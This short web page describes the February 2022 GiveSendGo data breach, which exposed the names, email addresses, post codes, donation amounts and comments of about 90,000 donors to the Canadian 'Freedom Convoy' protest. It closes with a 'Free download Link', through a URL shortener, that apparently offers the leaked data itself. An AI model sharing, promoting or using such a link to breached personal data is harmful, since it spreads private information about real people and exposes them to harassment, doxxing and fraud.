# GiveSendGo database leak

## Description

2022-02-07

In February 2022, the Christian fundraising service <a href="https://techcrunch.com/2022/02/14/freedom-convoy-donor-leak-givesendgo/" target="_blank" rel="noopener">GiveSendGo suffered a data breach which exposed the personal data of 90k donors to the Canadian &quot;Freedom Convoy&quot; protest against vaccine mandates</a>. The breach exposed names, email addresses, post codes, donation amount and comments left at the time of donation.

## Breached data

Email addresses, Geographic locations, Names, Purchases

## Free download Link

[GiveSendGo breach Free Download Link](https://tinyurl.com/2b2k277t)